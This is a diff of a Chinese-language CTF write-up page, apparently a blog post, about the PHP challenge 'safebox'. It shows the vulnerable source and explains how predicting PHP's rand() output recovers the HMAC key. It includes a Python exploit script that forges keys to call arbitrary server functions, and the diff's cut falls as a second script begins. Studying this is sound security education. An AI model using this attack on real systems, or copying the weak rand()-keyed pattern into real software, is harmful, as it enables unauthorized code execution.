@@ -24,161 +24,163 @@
 
 <p>随机访问<code>http://0dac0a717c3cf340e.jie.sangebaimao.com:82/?x_show_source</code>后得到源码为：</p>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="sd">/**</span>
-<span class="sd"> * Created by PhpStorm.</span>
-<span class="sd"> * User: phithon</span>
-<span class="sd"> * Date: 16/6/8</span>
-<span class="sd"> * Time: 上午12:24</span>
-<span class="sd"> */</span> 
+<div>
+  <pre><code class="php">&lt;?php
+/**
+ * Created by PhpStorm.
+ * User: phithon
+ * Date: 16/6/8
+ * Time: 上午12:24
+ */ 
 
-<span class="c1">//控制报错显示源码</span>
-<span class="nb">error_reporting</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
-<span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;x_show_source&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nb">show_source</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
-    <span class="k">exit</span><span class="p">;</span>
-<span class="p">}</span>   
+//控制报错显示源码
+error_reporting(-1);
+ini_set(&quot;display_errors&quot;, 1);
+if(isset($_GET['x_show_source'])) {
+    show_source(__FILE__);
+    exit;
+}   
 
-<span class="c1">//为每次会话开启session</span>
-<span class="nb">session_start</span><span class="p">();</span>
+//为每次会话开启session
+session_start();
 
-<span class="c1">//根据rand_str()生成6位SECRET_KEY和16位CSRF_TOKEN</span>
-<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">rand_str</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">rand_str</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
-<span class="p">}</span>   
+//根据rand_str()生成6位SECRET_KEY和16位CSRF_TOKEN
+if(empty($_SESSION['SECRET_KEY'])) {
+    $_SESSION['SECRET_KEY'] = rand_str(6);
+}
+if(empty($_SESSION['CSRF_TOKEN'])) {
+    $_SESSION['CSRF_TOKEN'] = rand_str(16);
+}   
 
-<span class="c1">//包含点，其中可能存在flag</span>
-<span class="k">include_once</span> <span class="s2">&quot;flag.php&quot;</span><span class="p">;</span>    
+//包含点，其中可能存在flag
+include_once &quot;flag.php&quot;;    
 
-<span class="c1">//使用rand()函数随机生成指定长度字符串</span>
-<span class="k">function</span> <span class="nf">rand_str</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">16</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="nv">$rand</span> <span class="o">=</span> <span class="p">[];</span>
-    <span class="nv">$_str</span> <span class="o">=</span> <span class="s2">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><span class="p">;</span>
-    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$n</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_str</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
-        <span class="nv">$rand</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$_str</span><span class="p">{</span><span class="nv">$n</span><span class="p">};</span>
-    <span class="p">}</span>
-    <span class="k">return</span> <span class="nb">implode</span><span class="p">(</span><span class="nv">$rand</span><span class="p">);</span>
-<span class="p">}</span>   
+//使用rand()函数随机生成指定长度字符串
+function rand_str($length = 16)
+{
+    $rand = [];
+    $_str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+    for($i = 0; $i &lt; $length; $i++) {
+        $n = rand(0, strlen($_str) - 1);
+        $rand[] = $_str{$n};
+    }
+    return implode($rand);
+}   
 
-<span class="c1">//对ajax的请求以json形式相应，否则直接转换成字符串输出</span>
-<span class="k">function</span> <span class="nf">output</span><span class="p">(</span><span class="nv">$obj</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_REQUESTED_WITH&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
-        <span class="nb">strcasecmp</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_REQUESTED_WITH&#39;</span><span class="p">],</span> <span class="s1">&#39;XMLHttpRequest&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="p">);</span>
-        <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: text/html; charset=UTF-8&quot;</span><span class="p">);</span>
-        <span class="k">echo</span> <span class="nb">strval</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>   
+//对ajax的请求以json形式相应，否则直接转换成字符串输出
+function output($obj)
+{
+    if(isset($_SERVER['HTTP_X_REQUESTED_WITH']) &amp;&amp;
+        strcasecmp($_SERVER['HTTP_X_REQUESTED_WITH'], 'XMLHttpRequest') === 0) {
+        header(&quot;Content-Type: application/json&quot;);
+        echo json_encode($obj);
+    } else {
+        header(&quot;Content-Type: text/html; charset=UTF-8&quot;);
+        echo strval($obj);
+    }
+}   
 
-<span class="c1">//每次提交check之后，将CSRF_TOKEN置为null</span>
-<span class="k">function</span> <span class="nf">check_csrf_token</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">])</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
-        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>   
+//每次提交check之后，将CSRF_TOKEN置为null
+function check_csrf_token()
+{
+    if(empty($_SESSION['CSRF_TOKEN']) || $_POST['CSRF_TOKEN'] !== $_SESSION['CSRF_TOKEN']) {
+        return false;
+    } else {
+        $_SESSION['CSRF_TOKEN'] = null;
+        return true;
+    }
+}   
 
-<span class="c1">//显示form页面</span>
-<span class="k">function</span> <span class="nf">show_form_page</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="cp">?&gt;</span><span class="x"></span>
-<span class="x">    &lt;!DOCTYPE html&gt;</span>
-<span class="x">    &lt;html lang=&quot;en&quot;&gt;</span>
-<span class="x">    &lt;head&gt;</span>
-<span class="x">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span>
-<span class="x">        &lt;title&gt;safebox&lt;/title&gt;</span>
-<span class="x">        &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span>
-<span class="x">    &lt;/head&gt;</span>
-<span class="x">    &lt;body&gt;  </span>
+//显示form页面
+function show_form_page()
+{
+    ?&gt;
+    &lt;!DOCTYPE html&gt;
+    &lt;html lang=&quot;en&quot;&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot;&gt;
+        &lt;title&gt;safebox&lt;/title&gt;
+        &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;  
 
-<span class="x">    &lt;div class=&quot;container&quot;&gt;</span>
-<span class="x">        &lt;form method=&quot;post&quot;&gt;</span>
-<span class="x">        &lt;div class=&quot;block title&quot;&gt;</span>
-<span class="x">            安全箱子</span>
-<span class="x">        &lt;/div&gt;</span>
-<span class="x">        &lt;div class=&quot;block show&quot;&gt;</span>
-<span class="x">            &lt;div class=&quot;line&quot;&gt;</span>
-<span class="x">                &lt;label&gt;输入验证字符串: &lt;/label&gt;</span>
-<span class="x">                &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span>
-<span class="x">            &lt;/div&gt;</span>
-<span class="x">            &lt;div class=&quot;line&quot;&gt;</span>
-<span class="x">                &lt;label&gt;输入方法　　　: &lt;/label&gt;</span>
-<span class="x">                &lt;input type=&quot;text&quot; name=&quot;act&quot;&gt;</span>
-<span class="x">            &lt;/div&gt;</span>
-<span class="x">        &lt;/div&gt;</span>
-<span class="x">        &lt;div class=&quot;block info&quot;&gt;</span>
-<span class="x">            &lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;</span>
-<span class="x">            &lt;input name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span>
-<span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;CSRF_TOKEN&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;CSRF_TOKEN&#39;</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
-<span class="x">        &lt;/div&gt;</span>
-<span class="x">        &lt;/form&gt;</span>
-<span class="x">    &lt;/div&gt;  </span>
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;form method=&quot;post&quot;&gt;
+        &lt;div class=&quot;block title&quot;&gt;
+            安全箱子
+        &lt;/div&gt;
+        &lt;div class=&quot;block show&quot;&gt;
+            &lt;div class=&quot;line&quot;&gt;
+                &lt;label&gt;输入验证字符串: &lt;/label&gt;
+                &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;line&quot;&gt;
+                &lt;label&gt;输入方法　　　: &lt;/label&gt;
+                &lt;input type=&quot;text&quot; name=&quot;act&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;block info&quot;&gt;
+            &lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;
+            &lt;input name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;提交&quot;&gt;
+            &lt;input type=&quot;hidden&quot; name=&quot;CSRF_TOKEN&quot; value=&quot;&lt;?php echo $_SESSION['CSRF_TOKEN'] ?&gt;&quot;&gt;
+        &lt;/div&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;  
 
-<span class="x">    &lt;/body&gt;</span>
-<span class="x">    &lt;/html&gt;</span>
-<span class="x">    </span><span class="cp">&lt;?php</span>
-<span class="p">}</span>   
+    &lt;/body&gt;
+    &lt;/html&gt;
+    &lt;?php
+}   
 
-<span class="c1">//显示报错页面</span>
-<span class="k">function</span> <span class="nf">show_error_page</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="cp">?&gt;</span><span class="x"></span>
-<span class="x">    &lt;!DOCTYPE html&gt;</span>
-<span class="x">    &lt;html lang=&quot;en&quot;&gt;</span>
-<span class="x">    &lt;head&gt;</span>
-<span class="x">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span>
-<span class="x">        &lt;title&gt;Error&lt;/title&gt;</span>
-<span class="x">        &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span>
-<span class="x">        &lt;!-- ?x_show_source --&gt;</span>
-<span class="x">    &lt;/head&gt;</span>
-<span class="x">    &lt;body&gt;  </span>
+//显示报错页面
+function show_error_page($msg)
+{
+    ?&gt;
+    &lt;!DOCTYPE html&gt;
+    &lt;html lang=&quot;en&quot;&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot;&gt;
+        &lt;title&gt;Error&lt;/title&gt;
+        &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;
+        &lt;!-- ?x_show_source --&gt;
+    &lt;/head&gt;
+    &lt;body&gt;  
 
-<span class="x">    &lt;div class=&quot;container&quot;&gt;</span>
-<span class="x">        &lt;div class=&quot;block title&quot;&gt;</span>
-<span class="x">            Error</span>
-<span class="x">        &lt;/div&gt;</span>
-<span class="x">        &lt;div class=&quot;block show&quot;&gt;</span>
-<span class="x">            </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$msg</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
-<span class="x">        &lt;/div&gt;</span>
-<span class="x">        &lt;div class=&quot;block info&quot;&gt;</span>
-<span class="x">            &lt;a href=&quot;javascript:history.back(-1)&quot;&gt;返回&lt;/a&gt;</span>
-<span class="x">        &lt;/div&gt;</span>
-<span class="x">    &lt;/div&gt;  </span>
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;block title&quot;&gt;
+            Error
+        &lt;/div&gt;
+        &lt;div class=&quot;block show&quot;&gt;
+            &lt;?php echo $msg; ?&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;block info&quot;&gt;
+            &lt;a href=&quot;javascript:history.back(-1)&quot;&gt;返回&lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;  
 
-<span class="x">    &lt;/body&gt;</span>
-<span class="x">    &lt;/html&gt;</span>
-<span class="x">    </span><span class="cp">&lt;?php</span>
-    <span class="k">exit</span><span class="p">;</span>
-<span class="p">}</span>   
+    &lt;/body&gt;
+    &lt;/html&gt;
+    &lt;?php
+    exit;
+}   
 
-<span class="nv">$act</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
-<span class="nv">$key</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
-<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">check_csrf_token</span><span class="p">())</span> <span class="p">{</span>                 <span class="c1">//csrf_token校验</span>
-    <span class="k">if</span><span class="p">(</span><span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">,</span> <span class="nv">$act</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//hmac_md5校验</span>
-        <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$act</span><span class="p">))</span> <span class="p">{</span>                                 <span class="c1">//函数存在性校验</span>
-            <span class="nv">$exec_res</span> <span class="o">=</span> <span class="nv">$act</span><span class="p">();</span>                                     <span class="c1">//调用指定函数</span>
-            <span class="nx">output</span><span class="p">(</span><span class="nv">$exec_res</span><span class="p">);</span>                                      <span class="c1">//输出函数返回结果</span>
-        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-            <span class="nx">show_error_page</span><span class="p">(</span><span class="s2">&quot;Function not found!!&quot;</span><span class="p">);</span>
-        <span class="p">}</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nx">show_error_page</span><span class="p">(</span><span class="s2">&quot;Permission deny!!&quot;</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="nx">show_form_page</span><span class="p">();</span>
-<span class="p">}</span></code></pre></div>
+$act = isset($_POST['act']) ? $_POST['act'] : &quot;&quot;;
+$key = isset($_POST['key']) ? $_POST['key'] : &quot;&quot;;
+if(isset($_POST['submit']) &amp;&amp; check_csrf_token()) {                 //csrf_token校验
+    if(hash_hmac('md5', $act, $_SESSION['SECRET_KEY']) === $key) {  //hmac_md5校验
+        if(function_exists($act)) {                                 //函数存在性校验
+            $exec_res = $act();                                     //调用指定函数
+            output($exec_res);                                      //输出函数返回结果
+        } else {
+            show_error_page(&quot;Function not found!!&quot;);
+        }
+    } else {
+        show_error_page(&quot;Permission deny!!&quot;);
+    }
+} else {
+    show_form_page();
+}</code></pre>
+</div>
 
 <p>所以重点在与最后的指定函数调用，分析如下：</p>
 
@@ -199,18 +201,22 @@
 
 <p>有没感觉很像，CTF题目中是多次输出rand()的值，再结合其生成算法，根据其之前生成的值预测之后的值：</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">O_31</span> <span class="o">=</span> O_0 + O_28 mod 2**31
-<span class="nv">O_32</span> <span class="o">=</span> O_1 + O_29 mod 2**31
-<span class="nv">O_33</span> <span class="o">=</span> O_2 + O_30 mod 2**31
-<span class="nv">O_34</span> <span class="o">=</span> O_3 + O_31 mod 2**31 
-<span class="nv">O_35</span> <span class="o">=</span> O_4 + O_32 mod 2**31
-<span class="nv">O_36</span> <span class="o">=</span> O_5 + O_33 mod 2**31</code></pre></div>
+<div>
+  <pre><code class="bash">O_31 = O_0 + O_28 mod 2**31
+O_32 = O_1 + O_29 mod 2**31
+O_33 = O_2 + O_30 mod 2**31
+O_34 = O_3 + O_31 mod 2**31 
+O_35 = O_4 + O_32 mod 2**31
+O_36 = O_5 + O_33 mod 2**31</code></pre>
+</div>
 
 <p>而我们这里呢，是每次提交后CSRF_TOKEN都会变化，而token中的字符根据对应关系也就是由rand()生成的值。但他们是向后预测，我们好像是向前推理，那该怎么办呢？加法会减法就不会啦?！</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">O_0</span> <span class="o">=</span> O_31 - O_28 mod 2**31
+<div>
+  <pre><code class="bash">O_0 = O_31 - O_28 mod 2**31
 ...
-<span class="nv">O_5</span> <span class="o">=</span> O_36 - O_33 mod 2**31</code></pre></div>
+O_5 = O_36 - O_33 mod 2**31</code></pre>
+</div>
 
 <p>可是我们这里的rand()是有范围的那该如何呢，<a href="https://www.google.com/webhp?sourceid=chrome-instant&amp;ion=1&amp;espv=2&amp;ie=UTF-8#q=php%20rand%20source%20code">搜一搜</a>翻出对应的<a href="https://github.com/php/php-src/blob/PHP-5.6.21/ext/standard/rand.c">源码</a>即可找到答案：</p>
 
@@ -220,109 +226,119 @@
 
 <p>对于<code>n' = a + n(b-a+1)/(M+1)</code>，我们先令a=0,b=61化简成<code>n' = 62n/(M+1)</code>,把运算用于整个公式，我再偷一下懒最后使用<code>(o[31+i]+62-o[28+i])%62</code>来推算前6位的SECRET_KEY，初步代码（new-1.py）如下：</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">re</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">hmac</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
-<span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">)</span> 
+<div>
+  <pre><code class="python">import re
+import requests
+import hmac
+import sys
+reload(sys)
+sys.setdefaultencoding('utf-8') 
 
-<span class="n">url</span> <span class="o">=</span> <span class="s">&quot;http://0dac0a717c3cf340e.jie.sangebaimao.com:82/&quot;</span>
-<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
-<span class="n">str_list</span> <span class="o">=</span> <span class="s">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>
-<span class="n">re_csrf_token</span> <span class="o">=</span> <span class="s">r&#39;(?&lt;=value=&quot;).*?(?=&quot;)&#39;</span>
-<span class="n">action</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>    
+url = &quot;http://0dac0a717c3cf340e.jie.sangebaimao.com:82/&quot;
+session = requests.session()
+str_list = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+re_csrf_token = r'(?&lt;=value=&quot;).*?(?=&quot;)'
+action = sys.argv[1]    
 
-<span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
-    <span class="n">d</span> <span class="o">=</span> <span class="p">[]</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)):</span>
-        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
-            <span class="k">if</span> <span class="n">token</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span>
-                <span class="n">d</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
-                <span class="k">break</span>
-    <span class="k">return</span> <span class="n">d</span>    
+def parse(token,s):
+    d = []
+    for i in xrange(len(token)):
+        for j in xrange(len(s)):
+            if token[i] == s[j]:
+                d.append(j)
+                break
+    return d    
 
-<span class="k">def</span> <span class="nf">guess</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="n">a</span><span class="p">):</span>
-    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
-        <span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="mi">31</span><span class="o">+</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="mi">62</span><span class="o">-</span><span class="n">d</span><span class="p">[</span><span class="mi">28</span><span class="o">+</span><span class="n">i</span><span class="p">])</span><span class="o">%</span><span class="mi">62</span>
-        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
-    <span class="n">key</span> <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">result</span><span class="p">)</span> 
+def guess(d,s,a):
+    result = []
+    for i in xrange(6):
+        r = (d[31+i]+62-d[28+i])%62
+        result.append(r)
+    key = ''.join(s[j] for j in result) 
 
-    <span class="k">return</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>  
+    return hmac.new(key,a).hexdigest()  
 
-<span class="n">r0</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-<span class="n">token0</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r0</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">d0</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token0</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
-<span class="n">payload0</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;submit&#39;</span><span class="p">:</span><span class="s">&#39;go&#39;</span><span class="p">,</span> <span class="s">&#39;CSRF_TOKEN&#39;</span><span class="p">:</span><span class="n">token0</span><span class="p">,</span> <span class="s">&#39;act&#39;</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">&#39;key&#39;</span><span class="p">:</span><span class="s">&#39;1234567&#39;</span><span class="p">}</span>
-<span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload0</span><span class="p">)</span>
-<span class="n">r1</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-<span class="n">token1</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r1</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">d1</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token1</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
-<span class="n">pre</span> <span class="o">=</span>  <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="n">d0</span><span class="o">+</span><span class="n">d1</span>
-<span class="n">key</span> <span class="o">=</span> <span class="n">guess</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span><span class="n">str_list</span><span class="p">,</span><span class="n">action</span><span class="p">)</span>
-<span class="n">payload1</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;submit&#39;</span><span class="p">:</span><span class="s">&#39;go&#39;</span><span class="p">,</span> <span class="s">&#39;CSRF_TOKEN&#39;</span><span class="p">:</span><span class="n">token1</span><span class="p">,</span> <span class="s">&#39;act&#39;</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">&#39;key&#39;</span><span class="p">:</span><span class="n">key</span><span class="p">}</span>
-<span class="n">r2</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload1</span><span class="p">)</span>    
+r0 = session.get(url)
+token0 = re.findall(re_csrf_token,r0.text)[-1]
+d0 = parse(token0,str_list)
+payload0 = {'submit':'go', 'CSRF_TOKEN':token0, 'act':action, 'key':'1234567'}
+session.post(url,data=payload0)
+r1 = session.get(url)
+token1 = re.findall(re_csrf_token,r1.text)[-1]
+d1 = parse(token1,str_list)
+pre =  [0,0,0,0,0,0]+d0+d1
+key = guess(pre,str_list,action)
+payload1 = {'submit':'go', 'CSRF_TOKEN':token1, 'act':action, 'key':key}
+r2 = session.post(url,data=payload1)    
 
-<span class="k">if</span> <span class="s">&#39;Permission deny!!&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-    <span class="k">print</span> <span class="s">&#39;[+]Done!&#39;</span>
-    <span class="k">print</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span></code></pre></div>
+if 'Permission deny!!' not in r2.text:
+    print '[+]Done!'
+    print r2.text</code></pre>
+</div>
 
 <p>由于rand生成算法中有加1的随机情况存在，所以这里就需要多推测几次得到正确的SECRET_KEY，进入if逻辑调用函数，所以再写一个初步的代码（get-1.py）重复测试</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
-<span class="c">#coding=utf-8   </span>
+<div>
+  <pre><code class="python">#!/usr/bin/env python
+#coding=utf-8   
 
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">subprocess</span>   
+import sys
+import subprocess   
 
